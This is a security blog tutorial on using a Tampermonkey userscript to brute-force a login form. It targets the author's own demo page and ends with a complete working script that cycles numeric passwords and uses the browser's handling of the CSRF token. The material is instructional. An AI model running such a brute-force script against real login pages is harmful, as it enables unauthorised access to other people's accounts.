---
layout: post
title: "Automating web application attacks with Tampermonkey"
thumbnail: monkey-240.jpg
date: 2017-05-24
---

[Tampermonkey](https://tampermonkey.net/) and [Greasemonkey](http://www.greasespot.net/) are userscript managers that make it possible to add custom Javascript functionality to web pages. User scripts can be used to customize pages, or to automate web interactions. In this post we will try to use Tampermonkey to automate filling out a login form, to try to brute force credentials.

## Submitting a form with Tampermonkey

Tampermonkey makes it possible to add custom Javascript to a page. This means we can program a little bit of functionality, like submitting a login form with credentials.

As an example, we will try to brute-force [this login form](http://demo.sjoerdlangkemper.nl/login.php). We create a new user script in Tampermonkey, and add the following code to fill out the form and submit it:


    (function() {
        'use strict';

        let usernameElem = document.getElementById('username');
        usernameElem.value = 'admin';

        let passwordElem = document.getElementById('password');
        passwordElem.value = '123';

        document.getElementsByTagName('form')[0].submit();
    })();

Save the script, and reload the login form. Note that it keeps refreshing the page over and over again. When we submit the form the page reloads, and this triggers our script again which submits the form, and so on. Use the escape key to end this endless loop.

![Failed login](/images/tampermonkey-failed-login.png "Failed login")

## Looping over passwords

Constantly submitting the form is basically what we want, except that we want to try another password each time. Note that a for loop would not work:

    (function() {
        'use strict';

        // Doesn't work
        for (let i = 0; i < 100; i++) {
            ...
            passwordElem.value = i;

            document.getElementsByTagName('form')[0].submit();
        }
    })();

After the first loop the form is submitted, our script is stopped and the page is reloaded. The value of `i` is not kept between page reload, so the loop starts again without incrementing `i`.

Instead, we need a way to keep state across page reloads. The functions [`GM_setValue`](https://tampermonkey.net/documentation.php#GM_setValue) and [`GM_getValue`](https://tampermonkey.net/documentation.php#GM_getValue) can do just that. To use these functions, first enable them with a grant header:

    @grant GM_setValue
    @grant GM_getValue

Then when the script is run, retrieve the value, increase it, and store it again:

    let counter = GM_getValue('counter', 0);
    counter += 1;
    passwordElem.value = counter;
    GM_setValue('counter', counter);

Note that the values stored with `GM_setValue` are persisent and can only be cleared by the Tampermonkey script. This can be annoying if you want to start your loop again from the start. While developing, you could add a button to the page to reset the counter:

    let buttonElem = document.createElement('button');
    buttonElem.innerHTML = 'restart';
    buttonElem.addEventListener('click', function() {
        GM_setValue('counter', 0);
        window.location = window.location.href;
    });
    document.body.appendChild(buttonElem);

## Handling success

With the script so far we try incremental numbers as passwords. However, when we have succeeded to log in we want to know what the correct password was. So we have to detect when we are logged in and print the password that was last used. To do this, we check whether the username field is present. If we have logged in, the login form with the username field will no longer be shown. If it is not present, we log the last password used:

    let usernameElem = document.getElementById('username');
    if (usernameElem) {
        ...
    } else {
        console.log('The password is ' + GM_getValue('counter'));
    }

## Running the script

Now, if we run the complete script (which can be found at the end of this post), it tries incremental numbers as password until the page no longer shows the login form, and then prints the correct password in the console.

![Successfully logged in](/images/tampermonkey-logged-in.png "Successfully logged in")

## Conclusion

In this post we have shown that Tampermonkey can be used to automate browser behavior in order to brute-force a login page.

The advantage of using Tampermonkey in brute-force attacks is that you get the default browser behavior. For example, the example form has CSRF protection, but we did nothing to obtain a valid CSRF token and submit that with the following request. The browser already does this for us. Furthermore, you can easily see what is happening as each response is rendered in the browser.

A disadvantage is that it is a lot slower than issueing requests in a script or using Burp Intruder. Also, the way to implement a loop with `GM_setValue` makes the code a bit awkward.

## Appendix: complete script

The complete script looks like this:

    // ==UserScript==
    // @name         Hack sjoerdlangkemper.nl
    // @namespace    https://www.sjoerdlangkemper.nl/
    // @version      0.1
    // @description  Brute-force a login page
    // @author       Sjoerd Langkemper
    // @match        http://demo.sjoerdlangkemper.nl/login.php
    // @grant        GM_setValue
    // @grant        GM_getValue
    // ==/UserScript==


    (function() {
        'use strict';

        let usernameElem = document.getElementById('username');
        if (usernameElem) {
            usernameElem.value = 'admin';

            let passwordElem = document.getElementById('password');

            let counter = GM_getValue('counter', 0);
            counter += 1;
            passwordElem.value = counter;
            GM_setValue('counter', counter);

            document.getElementsByTagName('form')[0].submit();
        } else {
            console.log('The password is ' + GM_getValue('counter'));

            let buttonElem = document.createElement('button');
            buttonElem.innerHTML = 'restart';
            buttonElem.addEventListener('click', function() {
                GM_setValue('counter', 0);
                window.location = window.location.href;
            });
            document.body.appendChild(buttonElem);
        }
    })();



